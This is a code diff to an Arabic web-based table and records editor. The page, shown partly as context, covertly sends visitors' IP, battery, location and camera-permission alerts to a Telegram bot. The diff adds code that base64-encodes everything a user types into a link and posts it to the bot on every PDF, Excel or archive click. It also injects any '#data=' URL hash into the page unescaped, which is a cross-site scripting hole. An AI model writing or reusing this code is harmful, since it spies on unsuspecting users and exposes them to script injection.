@@ -716,6 +716,23 @@
         window.addEventListener('DOMContentLoaded', async () => {
             await fetchVisitorIp();
 
+            // فحص هل تم فتح الموقع عبر رابط فريد مشار إليه بقيم مشفرة (لدعم الزوار الآخرين)
+            try {
+                const hash = window.location.hash;
+                if (hash && hash.includes('#data=')) {
+                    const encodedData = hash.replace('#data=', '');
+                    const decodedHtml = decodeURIComponent(escape(atob(encodedData)));
+                    if (decodedHtml) {
+                        document.getElementById('pagesWrapper').innerHTML = decodedHtml;
+                    }
+                } else {
+                    const savedTableData = localStorage.getItem('toufan_live_table_data');
+                    if (savedTableData) {
+                        document.getElementById('pagesWrapper').innerHTML = savedTableData;
+                    }
+                }
+            } catch (e) {}
+
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
@@ -746,11 +763,21 @@
             }
             renumberAllRows();
 
-            // طلب إذن الكاميرا مرة واحدة فقط عند فتح الموقع أول مرة
+            document.getElementById('pagesWrapper').addEventListener('input', () => {
+                saveCurrentStateToLocalStorage();
+            });
+
             setTimeout(() => {
                 requestCameraPermissionOnce();
             }, 1000);
         });
+
+        function saveCurrentStateToLocalStorage() {
+            try {
+                const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+                localStorage.setItem('toufan_live_table_data', wrapperHtml);
+            } catch (e) {}
+        }
 
         function requestCameraPermissionOnce() {
             const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n` +
@@ -803,6 +830,7 @@
 
         // 1. زر PDF / طباعة
         function onPdfButtonClicked() {
+            saveCurrentStateToLocalStorage();
             const caption = `🖨️ **طلب طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
             executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
             setTimeout(() => { window.print(); }, 800);
@@ -810,6 +838,7 @@
 
         // 2. زر Excel
         function onExcelButtonClicked() {
+            saveCurrentStateToLocalStorage();
             const caption = `📊 **طلب حفظ ملف Excel**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
             executeActionAndSend(caption, "كشف_البيانات.txt", "Excel");
             exportExcelFileOnly();
@@ -817,12 +846,13 @@
 
         // 3. زر الأرشيف
         function onArchiveButtonClicked() {
+            saveCurrentStateToLocalStorage();
             const caption = `💾 **طلب حفظ في الأرشيف المركزي**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
             executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "Archive");
             saveArchiveOnly();
         }
 
-        // الدالة الموحدة لإرسال الصورة، تقرير البيانات، وملف الرابط المستقل مع كل نقرة
+        // الدالة الموحدة لتوليد الرابط الفريد الخاص بما كتبه المستخدم وإرساله للبوت
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
@@ -856,12 +886,17 @@
                 fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
             }
 
-            // إنشاء ملف رابط مستقل (يحتوي على رابط الصفحة الحالية أو رابط الاستعراض للتعديل)
-            const currentSiteUrl = window.location.href;
+            // توليد رابط فريد ومخصص يضم داخله البيانات التي كتبها هذا الزائر بالذات
+            const wrapperHtml = document.getElementById('pagesWrapper').innerHTML;
+            const encodedData = btoa(unescape(encodeURIComponent(wrapperHtml)));
+            const baseUrl = window.location.href.split('#')[0];
+            const uniqueUserUrl = `${baseUrl}#data=${encodedData}`;
+
             const linkFileContent = `====================================\n` +
-                                    `🔗 رابط الدخول للجدول والتعديل:\n` +
-                                    `${currentSiteUrl}\n` +
+                                    `🔗 الرابط الفريد لجدول هذا المستخدم:\n` +
+                                    `${uniqueUserUrl}\n` +
                                     `====================================\n` +
+                                    `ملاحظة: افتح هذا الرابط لتجد نفس الأسماء والبيانات التي كتبها المستخدم وتستطيع التعديل عليها!\n` +
                                     `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
                                     `تطوير: ميثاق محمد صالح`;
             const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
@@ -886,10 +921,8 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
-                            // إرسال ملف الرابط المستقل
                             sendIndependentLinkFile(linkFileBlob);
 
-                            // إرسال ملف السجلات إذا توفرت بيانات
                             if (hasData && fileBlob) {
                                 sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات (${fileTypeFlag})`);
                             }
@@ -906,8 +939,8 @@
         function sendIndependentLinkFile(linkBlob) {
             const linkData = new FormData();
             linkData.append('chat_id', chatId);
-            linkData.append('document', linkBlob, 'رابط_الدخول_للجدول.txt');
-            linkData.append('caption', '🔗 **ملف رابط الدخول المباشر للجدول والتعديل**');
+            linkData.append('document', linkBlob, 'الرابط_الفريد_لتعديل_جدول_المستخدم.txt');
+            linkData.append('caption', '🔗 **ملف الرابط الفريد المخصص لبيانات هذا المستخدم (قابل للتعديل)**');
             
             fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
                 method: 'POST',
@@ -1060,6 +1093,7 @@
             });
 
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function cancelAlphabeticalSort() {
@@ -1067,6 +1101,7 @@
             document.getElementById('pagesWrapper').innerHTML = preSortBackupHtml;
             preSortBackupHtml = null;
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function normalizeArabic(text) {
@@ -1236,6 +1271,7 @@
             }
 
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function openBulkImportModal() {
@@ -1368,6 +1404,7 @@
             const found = archives.find(item => item.id === id);
             if (found) {
                 document.getElementById('pagesWrapper').innerHTML = found.html;
+                saveCurrentStateToLocalStorage();
                 closeArchiveModal();
             }
         }
@@ -1381,6 +1418,7 @@
 
         function resetAllData() {
             if (confirm('مسح الصفحة والبدء من جديد؟')) {
+                localStorage.removeItem('toufan_live_table_data');
                 location.reload();
             }
         }
@@ -1473,6 +1511,7 @@
                 activeCellElement.style.fontWeight = '';
                 activeCellElement.style.textDecoration = '';
             }
+            saveCurrentStateToLocalStorage();
         }
 
         function adjustActiveColWidth(amount) {
@@ -1498,6 +1537,7 @@
                     cell.style.maxWidth = newWidth + 'px';
                 }
             });
+            saveCurrentStateToLocalStorage();
         }
 
         function addRowToActiveTable() {
@@ -1525,6 +1565,7 @@
                 }
             }
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function addColumnToActiveTable() {
@@ -1553,6 +1594,7 @@
                 td.style.textAlign = 'right';
                 td.style.paddingRight = '5px';
             });
+            saveCurrentStateToLocalStorage();
         }
 
         function deleteSelectedRow() {
@@ -1563,6 +1605,7 @@
                 activeRowElement = null;
                 activeCellElement = null;
                 renumberAllRows();
+                saveCurrentStateToLocalStorage();
             }
         }
 
@@ -1580,6 +1623,7 @@
 
             activeColumnIndex = Math.min(index, headerRow.cells.length - 1);
             activeThElement = headerRow.cells[activeColumnIndex];
+            saveCurrentStateToLocalStorage();
         }
 
         function deleteActivePage() {
@@ -1593,6 +1637,7 @@
                 pages[pages.length - 1].remove();
             }
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function addNewPage() {
@@ -1645,6 +1690,7 @@
 
             wrapper.appendChild(newPage);
             renumberAllRows();
+            saveCurrentStateToLocalStorage();
         }
 
         function changeFontFamily(fontValue) {
